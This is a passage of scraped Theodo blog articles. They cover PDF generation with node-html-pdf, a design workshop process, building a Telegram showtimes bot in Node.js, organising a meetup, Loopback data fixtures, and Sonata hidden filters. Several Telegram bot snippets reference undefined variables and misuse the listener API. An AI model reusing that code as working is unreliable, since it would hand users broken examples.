\npage.paperSize = {\r\n  format: \"A4\",\r\n  orientation: \"portrait\",\r\n  margin: { \r\n    left:\"1cm\", \r\n    right:\"1cm\", \r\n    top:\"1cm\", \r\n    bottom:\"1cm\" \r\n  },\r\n  header: {\r\n    height: \"3cm\",\r\n    contents: phantom.callback(\r\n      function(pageNum, numPages) {\r\n        return(\"Header: \"+pageNum+\"/\"+numPages);\r\n      }\r\n    )\r\n  }\r\n}\r\n\nNow you have a header with a pagination, great! Footers work the same way. \nWe are able to generate great pdf now.But we have to use phantomjs on the server, and it\u2019s a binary, so we will need to launch the command path/to/phantomjs myscript.js from our server.And we need to handle errors, and be able to debug, etc\u2026It is a bit painful to handle that, and there are great tools out there that are able to get it done for us!On my project, we used nodejs and we found the node-html-pdf package, which is really great for our tasks!\nNode-html-pdf\nNode-html-pdf is a tool that uses phantomjs to print pdf.It adds some cool features and provide an easy API you can use on your Node.js server.The last thing you will have to do after reading this part is adding a route on your server which calls the pdf generation with phantomjs.Let\u2019s dig into this!\nNode-html-pdf provides a set of methods to easily generate pdf on your server.For example, the last example of the previous chapter can be done by writing: \n// myserver.js\r\n\r\nvar pdf = require(\"html-pdf\");\r\nvar fs = require(\"fs\");\r\nvar html = fs.readFileSync(\"./myhtml.html\");\r\nvar options = {\r\n  format: \"A4\",\r\n  orientation: \"portrait\",\r\n  border: { // note that margin becomes border\r\n    left:\"1cm\", \r\n    right:\"1cm\", \r\n    top:\"1cm\", \r\n    bottom:\"1cm\" \r\n  }\r\n};\r\n\r\npdf\r\n  .create(html, options)\r\n  .toFile(\r\n    __dirname + \"/mypdf.pdf\",\r\n    function (err) {\r\n      if (err) console.log(err);\r\n    }\r\n  );\r\n\nAnd you generate your pdf with the command: \nnode myserver.js\r\n\nBut that\u2019s not finished yet! Node-html-pdf adds some cool features like setting the header and the footer in your html instead of your js options.You can do that with specific id in your html: \n<!-- Default header -->\r\n<div id=\"pageHeader\">Header: {{page}}/{{pages}}</div>\r\n\r\n<!-- Default footer -->\r\n<div id=\"pageFooter\">Footer: {{page}}/{{pages}}</div>\r\n\r\n<!-- nth header -->\r\n<div id=\"pageHeader-n\">My nth header</div>\r\n\nThe last example shows that you can even set a default header of your pages and use another one for specific pages!\nThere is one thing i did not mention yet, and it is how to use pictures and scripts.With node-html-pdf, it\u2019s pretty easy: you have to define the path of your asset folder in options and reference the file you want in your html:\n// myserver.js\r\nvar options = {\r\n  \u2026,\r\n  base: \"file://\" + __dirname + \"/asset/\"\r\n};\r\n\r\n<!-- myhtml.html -->\r\n<img src=\"myimage.png\" /> \r\n<!-- myimage.png is in my asset folder, at the root of my directory -->\r\n\nConclusion\nWe now know how to generate great pdf on your server.It is no longer painful to generate a pdf using html. And you can use your favorite templating engine (like mustache, handlebars, \u2026) to insert your data and make the perfect pdf!\nKnown issue: \nThere is an issue we faced using node-html-pdf: \n\nImages in header are not rendered.To handle that, you can convert your images in base64 and replace the output in your html string.If you\u2019re not using a templating engine, you can do:\nvar html = fs.readFileSync(\"path/to/html\")var image = fs.readFileSync(\"path/to/dog.png\");var encodedImage = new Buffer(image).toString(\"base64\");html = html.replace(\"{{encodedImage}}\", encodedImage)pdf.create(...).toFile(...);\n\n\nAnd in your html file:\n<img src=\"data:image/png;base64,{{encodedImage}}\" .../>\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRichard Casetta\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou want to know how you can move from this design\u2026\n\n\u2026to this new one\n\nin two weeks in your project?\nThis article aims at giving you precise guidelines on how to build a custom-made interface without any \u2013 conscious \u2013 prior knowledge of design.\nLet\u2019s get started!\n1. Spot the Need\nA great design is a design led by a real user need in terms of ergonomy.\u00a0Making a gratuitous ergonomy is a waste of time for your project.\nA good ergonomy need can be expressed this way: \u201cAs a user, I can\u2026\u201d.\u00a0The more precise the user\u2019s need is, the better the resulting design is.\nThe website TrainLine is a great example of ergonomy that was built towards one precise and motivating user need: \u201cAs a user, I can book a train ticket in less than one minute\u201d.\u00a0Such a good need is essential as it drives the designing and the development processes all the way.\nThere are two options to get a user need:\n\nif you have had the opportunity to meet the users or to get user feedbacks, take them into account to define with your client a precise user need;\nif you couldn\u2019t reach the users, don\u2019t panic!\u00a0Make multiple hypotheses on different user needs and use cases and build different designs based upon them.\n\n2. Analyse the Need\nNow that you are focused on precise use cases and ergonomy goals, it is time to analyse your application\u2019s features and components with respect to those.\nPlan a \u201cdesign workshop\u201d of approximately half a day.\u00a0The expected output is a document you will give to your client, just like this one:\n\n\nimprovement points that you spotted about the existing ergonomy: misplaced buttons, lacking functionality\u2026\ndesign proposals that state the hypotheses made about user needs, the global behaviour of the application on a use case \u2013 \u201cthis panel opens when I click that button\u2026\u201d \u2013 and screenshots of model applications, if possible\na comparison table in which you mention the development complexity, the advantages and drawbacks of each solution along with the opinion of the development team about the most adapted solution.\n\nAsk your fellow developers their opinion about the usability of this or that component, the position of this panel, existing model applications that they possibly know about that would be a great source of inspiration for your design \u2013 do not hesitate to use screenshots!\u00a0You may be surprised: in a way, a web developer is a user experience specialist as they spend their time surfing on the Internet and making web applications.\u00a0If you have any doubt about that, don\u2019t hesitate to show your current application around you: you will get a bunch of usability feedbacks.\nThink about the UX library you want to use.\u00a0I personally love Google Material, and its specifications are very useful to build your design if you are not sure of where to position a panel or which size should a button be.\nKeep in mind that you want something that is\u00a0both pretty and usable.\u00a0To avoid creating beautiful but useless components \u2013 a slider that only allows the user to choose between the two extremal values, for instance -, always think as if you were a user of the application, in terms of use cases.\n3. Prepare Your Design\nThe document that you just sent to your client is certainly of great value, but now your client wants a glimpse of what his application could look like.\u00a0This is the moment you can really create value and convince your client.\u00a0According to a client that I had on a project:\nWhat helped us the most during the design workshop were the templates and the fact that we could adjust things live together.\nWhat you have to do is transform what you said in the previous document in images.\u00a0Several tools can help you do that:\n\nSoftware like\u00a0Moqups are great for they allow you to pick components from famous libraries \u2013 such as Material and Bootstrap -, customize them to your needs and integrate them in your templates.\nMore generic tools like Photoshop or Gimp also do the trick if you are used to them, although the exercise is a little bit different.\u00a0I suggest taking screenshots of the components and pasting them into your image document according to your needs.\u00a0I personally use React Toolbox whose website features a playground for each component, in which you can customize your component\u2019s behaviour and appearance before you copy it to your document.\u00a0If the library that you want to use does not come with that kind of playground, you can tweak the component directly using the Chrome inspector.\n\nWhat you want to do is showing not only the components you want to use, but also how they come together in your ergonomy.\u00a0Here is an example of what you can do with Moqups:\n\nFocus on components: unlike webdesigners, you know the libraries you can use to design your application, which makes it easy for you to estimate how much it will cost to your client to transform the application ergonomy.\nPrefer using an existing and reusable component rather than creating one from scratch. Of course your client may have specific needs, but sometimes there is a good reason why an awkward custom-made component does not exist\u2026\nPrepare yourself to edit your design \u201clive\u201d.\u00a0When you meet your client or the users, it is very useful to discuss the design while editing it live.\u00a0This way you can adjust the ergonomy to the user\u2019s need.\n4. Convince Your Client\nYou are now ready to show your work to your client.\nSet up a workshop with the main members of the project \u2013 your client and the stakeholders \u2013 and the people who may have an influence over your design \u2013 users of course, but also marketing.\nYou will take the lead for the first part of the workshop: show your templates and explain the choices you made in terms of ergonomy.\nDo not hesitate to show the behaviour of your components: the animations of your graphs or inputs are always a good way to impress people and bring life into your design.\nYou can then discuss details with the stakeholders and the users.\nWrite down their feedbacks and adapt your design to their needs: play with your templates to give your users live results of their ideas.\n5. Develop and iterate\nAt this moment the best is yet to come and you made the hardest part of the work.\u00a0Turning your design templates into development tickets should now be quite easy.\n\nTry to create the smallest development tickets: adding a button, moving an input from one panel to another or adding a header are features without uncertainty that you can easily estimate.\nAlways keep in mind that your application has to stay functional\u00a0throughout the process: building a new ergonomy is a waste of time if you loose the features, even temporarily.\n\nThe most important thing is to\u00a0continuously incorporate improvement in your ergonomy.\u00a0Reach the users as often as you can to get their feedback: this way you can iterate over the process to create an application that fits the user\u2019s needs perfectly.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLo\u00efc Gelle\r\n  \t\t\t\r\n  \t\t\t\tAgile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen we design a product at Theodo, we follow the Lean Startup methodology. Which means we try to ship a Minimum Viable Product for our clients as soon as possible, and then iterate on this product using final user feedback in order to avoid developing useless features.\nThis methodology implies focusing on the core business features. However, while developing a product, you often face many other challenges (design, technical infrastructure) that might slow you down and distract you from creating value for your customer.\nIn this vein, Chatbots are a way to create the perfect MVP. Chatbots are software services that you offer through traditional messaging apps that users already installed on their phones (the most famous of them being Facebook Messenger, Whatsapp, Slack, Telegram\u2026 ). Since you are bound to using the conversational interface provided by those services, you do not need to focus on things like design and delivering message in real time through a robust infrastructure: those platforms do it for you.\nIn this series of blog posts, I will show you the potential of different messaging platforms on which you can easily build bots through an example I personally implemented: a bot to search through movie showtimes around me in Paris.\nTelegram\nThe first platform I will introduce is Telegram since it is the easiest one to work with. It has a huge community of over 100M monthly active users, and is free of charge and cross-platform.\nStep 1: Talk to the BotFather\nIn order to create a bot, you have to talk\u2026 to a bot!\n\n\n\nThe Botfather\nGet your application token\n\n\n\n\n\n\n\n\n\nGet in touch with the BotFather on Telegram in order to create a bot, give it a profile picture, and get a token to be notified when it receives messages \u2013 and answer accordingly.\nNow I advise storing this token in your .bash_profile or equivalent in order to use it in your code.\nexport CINEBOT_TELEGRAM_TOKEN=XXXXX\r\n\nListening to your Bot\nIn order to fetch messages received by your bot, Telegram offers two options: Long Polling and Webhooks\nLong Polling\n\nLong polling is a way to retrieve new information from the server. Unlike traditional polling \u2013 which opens an HTTP connection, fetches the newest results, and then closes the connection, every X seconds \u2013 long polling makes an HTTP request to the server and keeps that connection open\u00a0until it receives fresh informations, and then closes the connection. We only send a ping when the connection is closed, either because we received data, or because the request timed out.\nWebhooks\n\nWebhooks are one of the most used technologies to implement reaction on an event happening on a distant server. The idea is to indicate to the chatbot platform (Telegram, Facebook Messenger) an endpoint on which your application will be listening. Whenever your bot receives a message, the chatbot platform sends a POST request to this endpoint, containing information about the messages your bot received (sender identifier, content, location, etc\u2026). Since you need to specify an IP address, it requires that you host your application on a server, unless you use a tunneling application like Ngrok that allows you to generate a fixed proxy address that redirects to your localhost. Read this article by my fellow Theodoer Matthieu Augier if you\u2019re interested in that.\nGetting started\nI chose to implement this application in NodeJS, since it allows us to handle asynchronous events (like receiving messages and responding) by default, and is fast as well as commonly understood.\nmkdir cinebot\r\nnpm init\r\nnpm install --save node-telegram-bot-api\r\ntouch bot.js\r\n\nNow we\u2019ll start coding! The code I will insert here can be found in a demo repository I created for this article. It contains the code for the whole Telegram bot as well as a mock for the showtimes API.\nHandling messages\nI chose to use a NodeJS library that allows for listening to event received by my bot and react accordingly. Here I chose the option to listen to messages using long polling because it allows you to get your bot up and running in a few minutes.\n  var TelegramBot = require('node-telegram-bot-api');\r\n  var CineApi = require('./cine-api.js')\r\n\r\n  var telegramToken = process.env.CINEBOT_TELEGRAM_TOKEN;\r\n\r\n  // Setup polling way\r\n  var bot = new TelegramBot(telegramToken, {polling: true});\r\n  var cineApi = new CineApi();\r\n\nThe CineApi class implements methods that will enable us to query showtimes data using text and location, as well as format the response for sleek display.\n  CineApi.prototype.query = function(text, location, onResultCallback) { ... }\r\n\r\n  CineApi.prototype.formatTitle = function(hit) { ... }\r\n\r\n  CineApi.prototype.formatDescription = function(hit) { ... }\r\n\nSaying Hello\nA good way to get your user onboard is through a warm welcome message, which you can also use to explain how to converse with your bot. For this purpose, I advise to create a file introduction.txt within your bot folder, that will contain that message.\nThen you need to listen to the /start command which a user automatically triggers when they want to converse with your bot\n  bot.onText(/\\/start/, function(msg, match) {\r\n    var chatId = msg.from.id;\r\n    bot.sendMessage(chatId, introText);\r\n  });\r\n\nnode bot.js\r\n\nNow engage with your Bot \u2013 from your phone, or the Telegram web view \u2013 WOW\u00a0\ud83d\ude0d\n\nHandling text messages\nThe first step for the bot is to be able to fetch showtimes based on some text from the user.\n  bot.on(/\\/showtimes (.+)/, function(msg, match) {\r\n    var queryText = match[1]\r\n    var chatId = query.chat.id\r\n\r\n    cineApi.query(queryText, null, function(result) {\r\n      var seances = content.hits;\r\n      var response = ''\r\n      for(var i = 0; i < seances.length; i++) {\r\n        var seance = seances[i]\r\n        var response = cineApi.formatTitle(seance) + '\\n' + cineApi.formatDescription(seance) + '\\n'\r\n\r\n        bot.sendPhoto(chatId, seance.movie.posterUrl, {caption: response})\r\n      }\r\n    });\r\n  });\r\n\n\nHandling location messages\nUsually, I find myself in situations where I want to go see a movie nearby, but I do not know where the closest cinema is, or which movies it features. Therefore, I want to be able to send my location to my bot, and retrieve the showtimes of theaters around me.\n  bot.on('location', function(message) {\r\n    var chatId = message.chat.id\r\n\r\n    // Doesn't hurt being polite\r\n    bot.sendMessage(chatId, 'Thanks for your location!')\r\n\r\n    cineApi.query(' ', message.location, function (content) {\r\n      var showtimes = content.hits;\r\n      var response = ''\r\n      for(var i = 0; i < seances.length; i++) {\r\n        var seance = seances[i]\r\n        var response = cineApi.formatTitle(seance) + '\\n' + cineApi.formatDescription(seance) + '\\n'\r\n\r\n        bot.sendPhoto(chatId, seance.movie.posterUrl, {caption: response})\r\n      }\r\n    });\r\n  })\r\n\n\nReducing friction: use custom keyboards\nUsing location is great, but it requires the user to make the effort of sending you his location. To reduce the friction even more, you can use custom keyboards to control the users choices, and bind actions to buttons to improve the user experience. Let\u2019s see below how we can improve our intro message to directly engage the user by offering them the choice to try the service with just one tap.\n  // Editing directly the /start callback\r\n  bot.onText(/\\/start/, function(msg, match) {\r\n    var chatId = msg.from.id;\r\n    bot.sendMessage(chatId, introText);\r\n\r\n    var opts = {\r\n      reply_markup: {\r\n        keyboard: [[{'text': 'Oui', 'request_location':true} ], ['Non']],\r\n        resize_keyboard: true,\r\n        one_time_keyboard: true\r\n      }\r\n    }\r\n    setTimeout( function() {\r\n      bot.sendMessage(chatId, 'I need your location to help you! Can you send me your location?', opts);\r\n    }, 3000)\r\n  });\r\n\nMimicking a human being by setting a fake 3 seconds wait is also a way to make your user experience more natural.\n\nCombining both with inline queries\nAn amazing feature from Telegram is that you can query a bot directly from a conversation with someone else. This allows us to combine text and location-based searches in a very natural way:\nbot.on('inline_query', function(request) {\r\n  var queryText = request.query;\r\n  var queryLocation = request.location\r\n    var inline_query_id = request.id;\r\n    cineApi.query(queryText, queryLocation, function (content) {\r\n        var hits = content.hits;\r\n        var inlineResults = []\r\n\r\n        for(var i = 0; i < hits.length; i++) {\r\n            var inlineResult = hitToInlineResult(hits[i]);\r\n            inlineResults.push(inlineResult);\r\n        }\r\n\r\n        bot.answerInlineQuery(inline_query_id, inlineResults);\r\n    });\r\n});\r\n\nThis can prove useful in many situations, like for example when you need to quickly set up a movie date with Scarlett Johansson!\n\nReady for production\nWe now have a working useful bot that runs in local. But if you want your bot to stay up and running at all time so that you can sleep peacefully, you\u2019ll need to deploy your bot on a server and run a process manager to take care of it.\nI personally use Digital Ocean which has one of the cheapest plans out there. Coupled with pm2, I can sleep safe knowing that my bot is ready to help night wanderers find the right movie at the right theater, at all time.\nYou can use the bot here if you want to test it live! However it only\u00a0gives you the showtimes of French theaters around Paris at the moment.\nThat\u2019s all folks!\nJust kidding, a second part is coming! That one will focus on Facebook Messenger: with over a billion daily active users, it is currently the most used messaging app in the world, and offers slightly different functionalities compared to Telegram.\nI will also discuss the best ways to remember users in order to re-activate them on a regular basis.\nData & Credits\nBuilt with  , with data from   \nInterested in building a Chatbot ? Please leave a comment if you need advice or just want to discuss \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9my Gotteland\r\n  \t\t\t\r\n  \t\t\t\tFull-Stack Agile Developer @ Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n      Three months ago, we organized our first meetup in London: the React Native London meetup.\n      Fourty React Native developers showed up at our office to discuss the use of Redux alongside React Native and a whole lot of other things.\n    \nSince then we have organized two other such meetups.\nOverall, I think it's been a great success: we hit the guest limits pretty quickly each time and the attendees seem to like it.\nWe plan on having such meetups every month, so if React and mobile development are your thing, come and join us!\nThe following is our recipe to organize a meetup from scratch and get started.\n    It describes the way we organized ours and might not correspond to what other people do or recommend.\n    But it worked out for us, so we might as well share it!\n\n      This article is built as a checklist to help you organize your meetup.\n      It's quite comprehensive and maybe a bit obvious at times, but it's what a checklist should be like, right?\n    \nIn this article I'm kind of assuming you're targeting a developers audience but feel free to adapt this checklist to your needs!\nAlright, let's start.\nChoose a cool topic\nSome advice for a successful meetup:\n\n\n        Pick a trending topic. Lots of people interested means more attendees.\n      \n\n        Make sure there isn't already a similar meetup in your area. Eg. who needs a \"London React Native Community\" when there is already a \"React Native London\" meetup ?\n      \n\nThat's it for this part. </CaptainObvious>\nBuild an organisation team\n\n      Organising a meetup requires a lot of not-forgetting-stuff and making-sure-stuff-is-ready.\n      Doing so in a team allows you to remind and challenge each other, which is always for the best.\n    \nI found a 3 people team to be quite effective but you'll be fine as long as you have a handful of people willing to help.\n\n\n        There is an organisation team. Around three people is cool.\n      \n\nGet public\nTime to create your page on meetup.com. Head to the meetup creation page and fill the form.\n\n\n        Your meetup name should be as simple as possible. \"Greater London React Native Community Meetup\" is difficult to understand and even harder to remember. \"React Native London\" is much simpler.\n      \n\n        Choose the unlimited plan. You definitely want more than 50 members.\n      \n\n        Give co-organiser access to your team. So everyone can contribute and plan meetups.\n      \n\n        Customize your meetup page. Choose a colour palette and a banner matching the theme of your meetup. The group logo and the cover photo are very important as well, they're the first things potential members will see when browsing meetup.com\n      \n\n        Create your first meetup event. No need to set a date or venue right now, this is just a draft to show your visitors you're serious.\n      \n\n        Invite everyone. People at your company, acquaintances interested in the topic, friends, etc.\n      \n\nPrepare your first meetup\nTalks\nThis is a bit of a developer-centric section. Maybe your meetup isn't about people giving talks in front of the audience, in which case the question you should try to answer in this section would be \"what will members be doing when they show up?\".\n    Anyway, back to our developer meetup.\nHopefully you already know someone willing to give one (or someone you can coerce into giving one). If that isn't the case the simplest solution is to give one yourself.\n\n\n        Have at least one speaker commited to giving a talk. Don't worry if you can only find one speaker, openspaces are always a good option to keep the discussion going. More about that below.\n      \n\nSet a date and a place\nThe sooner it happens the better! No need to overthink it, you should be able to go through this checklist in a matter of days, a couple weeks at most.\n\n\n        Set a definitive date on the event page. Ideally in less than two weeks.\n      \n\nFor the venue, your company's office is the first solution that comes to mind. It may not be an option for everyone so you can also explore alternative options such as co-working spaces, office space companies, etc.\n\n\n        Set a venue on the event page. With an address and instructions detailing how to get there from the nearest tube station/bus stop.\n      \n\n        Put a limit to the number of people you can host. Depending on the venue. Also, enable the waiting list!\n      \n\nYou should always expect less people than the number of \"Yes\" RSVP in meetup.com (although it depends on the audience/success of the meetup), but don't put the limit at 60 if you can host 30 or you'll have problems!\nSpread the word\nTime to reach out to everyone in your area and fill your first meetup!\n\n\n        On the internet. Reach out to developer communities around you using Twitter, Slack chans, Gitter, etc.\n      \n\n        Related meetups. Attend meetups similar to yours, become friends with the organizers and ask everyone to join yours.\n      \n\nPrepare\n\n\n        Create the following event on meetup.com. So you can talk about it during the meetup. Without date or venue if necessary.\n      \n\n        Plan for food. Don't forget paper plates, napkins and bottle openers. Also, healthy food is good, pizza isn't your only option!\n      \n\n        Get a video projector. And a white screen.\n      \n\n        Rehearse. At least once. Introduction (you) and talks (speakers).\n      \n\nThe day of the meetup\n\n\n        Make sure attendees can enter the building. Have someone open the door / guide people to the room if necessary.\n      \n\n        Serve food and drinks. And talk to the attendees, learn from them: what do they want to learn/see?\n      \n\n        Give your introductory talk. What is this meetup about? When do we meet? We need your help! \"Btw, next meetup is on meetup.com!\"\n      \n\n        Talks. Prepare a few questions in case there are none at the end of the talks. A lightsaber makes for a very good presentation stick.\n      \n\n\n      If you do not have enough talks for the duration of your meetup, now is the time to use one of our favourite learning/leadership format at Theodo: the Open Space.\n      It is a great way to get people talking on the subjects they're interested in.\n    \n\n\n        (optional) Organize an Open Space. If you don't have enough talks.\n      \n\nLast but not least, probably the most important part of the meetup:\n\n\n        Reach out for people willing to help. Be it by giving talks or helping with the organization. Don't forget to get their contact info (mail, twitter, etc).\n      \n\nFollow-up\n\n\n        Retrospective. What went wrong? What went right? Find ways to improve for next time.\n      \n\n        Give feedback to the speakers. Help them help you.\n      \n\n        Reach out to the people you met. Stay in contact with those interested in giving a talk or helping with the organization. Thanks attendees on meetup.com.\n      \n\nGood job, you've reached the end of the checklist, that means you should be ready to host your own meetup!\n    Tell us how it was and let us know your suggestions to improve this checklist.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNathan Gaberel\r\n  \t\t\t\r\n  \t\t\t\tArchitect-developer at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n  Are you a Loopback user?\n  Have you ever wondered how to get extra quickly randomized data fixtures for your project?\n  Are you fed up with writing for loop, using Math.random or generating INSERT INTO statements with Excel?\n\n\n  On my first project with Loopback in Theodo, that was the kind of issues I was facing with data fixtures generation.\n\n\n  We developed a visualization tool of financial data using tables and graphs with my team. We had to use dozens of raw data stored in our database in order to display one cell of a table or a single point of a graph.  And we can not use real production data for security and privacy reasons.\n\n\n  At Theodo, we work with the Scrum methodology, which implies in particular that each developed feature must be validated by the Product Owner of the project. To enable the Product Owner to validate this feature, we should then be able to produce a consistent and representative set of data, so that we can verify that the developed visualisation tool provides a clear enough vision to deliver real business value to users.\n  Our problem was to generate large sets of random data.\n\n\n  After a tedious attempt where I used Excel to generate INSERT statements in SQL, and another where I used a combo of for loops, Math.random and MomentJS: the generated code was becoming so unreadable and so complex that I could not adjust parameters to generate relevant set of data.\n\n\n  Above all, I come from the world of PHP, I have worked on many projects in Symfony2.\n\n\n  In PHP, nelmio/alice is a simple and pragmatic solution, and I decided to take inspiration from this library to solve my problem.\nI have written a Loopback component published on NPM that enables to quickly generate huge sets of random data:\n\n\n  https://github.com/sghribi/loopback-fixtures\n\n\n  This library has following features:\n\n\nGenerate data based on your Loopback model (and not your database scheme)\nLoad data with YAML\nIntegrate a fake data generator: FakerJS\nGenerate massive range of data thanks to helpers\nHandle easily relations between your models\n\nLet\u2019s see it in action!\nQuick install\n\nStep 1: install component\n\nnpm install --save loopback-fixtures\n\nStep 2: enable component\n\nThen, in your server/component-config.json, add :\n{\r\n  // Other components...\r\n  \"loopback-fixtures\": {}\r\n}\n\nStep 3: write a YAML fixture file: fixture/data/data.yml\n\nLet\u2019s see how it works with examples in the next part.\nDemo with User and Group models\nLet\u2019s suppose we have two models:\n\n\n    Group: name\n  \n\n    User: name, email and description, and linked to Group model\n  \n\nThis will generate 3 users with random name and email:\nUser:\r\n  user_blue:\r\n    name: \"{{name.firstName}} {{name.lastName}}\"  # <-- {{name.firstName}} : random first name\r\n    email: \"{{internet.email}}\"                   # <-- {{internet.email}} : random email\r\n  user_white:\r\n    name: \"{{name.firstName}} {{name.lastName}}\"\r\n    email: \"{{internet.email}}\"\r\n  user_red:                                       # <-- user_red : should be an unique reference\r\n    name: \"{{name.firstName}} {{name.lastName}}\"\r\n    email: \"{{internet.email}}\"\r\n\nIn this first example, we are using FakerJS to provide random names for these three generated users: {{name.firstName}} {{name.lastName}}.\nThis will generate 1000 users with random data:\nUser:\r\n  user_{1..1000}:                    # <-- {1..1000} : duplicate this line 1000 times\r\n    name: \"{{name.firstName}}\"\r\n    description: \"I'm user n\u00b0{@}!\"   # <-- '{@}' will be remplaced by : 1, 2... 1000\r\n\nThe helper user_{1..1000} is a shortcut to write: user_1, user_2\u2026 user_1000.\nThis will generate 1000 users in two groups:\nGroup:\r\n  humans:                               # <-- is referenced by @humans\r\n    name: \"The Humans\"\r\n  robots:\r\n    name: \"We are ROBOTS\"\r\n\r\nUser:\r\n  human{1..500}:\r\n    description: \"I'm human n\u00b0{@}!\"\r\n    groupId: @humans                    #\u00a0<-- this references \"humans\" Group\r\n  robot{1..500}:\r\n    description: \"I'm robot n\u00b0{@}!\"\r\n    groupId: @robots\r\n\nThe notation @humans is used to handle relations between generated data: it refers to the humans group.\nThis will generate 1000 users randomly dispatched in 10 groups:\nGroup:\r\n  group_{1..10}:\r\n    name: \"Group n\u00b0{@}\"\r\n\r\nUser:\r\n  users_{1..1000}:\r\n    name: \"{{name.firstName}}\u00a0{{name.lastName}}\"\r\n    groupId: @group.*\r\n\nThese examples show you how you can customize your fixture file to get extra quickly massive randomized data.\nYou can read and discover all awesome features provided by this component by reading the README.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSamy Ghribi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHow to enforce and hide filters on a Sonata\u2019s list view\nSonata provides you with a robust and easy to implement interface administration for your Symfony projects.\nWe have been using and loving it on my projects for 19 weeks now. Every day we are amazed with the time we save thanks to Sonata.\nHowever, there are some features that our client wants that are missing. One of them is the possibility to hide filters.\nImagine you want your users to see a pre-filtered Sonata list and do not display the filters.\nIn our case we receive applications. Each application has a status and a at certain point we have a button \u201cView pending application\u201d. This button of course is supposed to list only the \u201cpending\u201d applications and we don\u2019t want the users to be able to change this filter.\nThis solution is really straight-forward and easy to implement, give us 5 minutes and 30 lines of code!\nNote: this tutorial is written for Symfony 2.8 and Sonata 2.3. Let me know in the comments if you tested it on other configurations.\nThe easy solution : createQuery\nWhen you search for a solution online you easily find examples of people using the createQuery function of Sonata:\nIn your admin class:\nclass ApplicationAdmin extends SonataAdmin\r\n{\r\n    public function createQuery($context = 'list')\r\n    {\r\n        $query = parent::createQuery($context);\r\n        $rootAlias = $query->getRootAliases()[0];\r\n        $query\r\n            ->andWhere($query->expr()->eq($rootAlias . '.status', ':statusPending'))\r\n            ->setParameter('statusPending', Application::STATUS_PENDING)\r\n            ;\r\n            \r\n        return $query;\r\n    }\r\n}\r\n\nThis works great but we had one major issue with that solution:\n\nThe filter is always enforced and there is no way to display the same list without it.\n\nThe better solution : hiddenFilters\nIn our project we had to display the same list, sometimes with hidden filters enforced, sometimes not.\nThat\u2019s why we went a step further and created a \u201cHiddenFilters\u201d mechanism.\n\nUse URL parameters to define which filters to set up\n\nclass ApplicationAdmin extends SonataAdmin\r\n{\r\n    // This array will contain our filters, filters are an object with a unique key and a value\r\n    private $hiddenFilters;\r\n    \r\n    // This function reads the filters from the URL\r\n    private function readHiddenFilters()\r\n    {\r\n        return $this->getRequest()->query->get('hiddenFilters');\r\n    }\r\n    \r\n    // CreateQuery is called to generate the list before the admin list view is rendered\r\n    public function createQuery($context = 'list')\r\n    {\r\n        $query = parent::createQuery($context);\r\n        $rootAlias = $query->getRootAliases()[0];\r\n\r\n        // Make sure we have the last filters in memory\r\n        $this->hiddenFilters = $this->readHiddenFilters();\r\n\r\n        // Do any kind of check on those filters, here we check that \"statusPendingFilter: true\" was set\r\n        if (is_array($this->hiddenFilters) && array_key_exists('statusPendingFilter', $this->hiddenFilters) && $this->hiddenFilters['statusPendingFilter']) {\r\n            $query\r\n                ->andWhere($query->expr()->eq($rootAlias . '.status', ':statusPending'))\r\n                ->setParameter('statusPending', 'PENDING')\r\n                ;\r\n        }\r\n        \r\n        return $query;\r\n    }\r\n}\r\n\nNow, when you want to activate a hidden filter on your list, call it with the correct parameters in the URL:\n<a href=\"{{ path('admin_application_list', {'hiddenFilters' : {'statusPendingFilter' : true}}) }}\">\r\n\n$this->router->generate('admin_application_list', array('hiddenFilters[statusPendingFilter]' => true));\r\n\n\nSave your hidden filters as persistent parameters\n\nYou now have great filters you can enable and disable at will. Last issue: 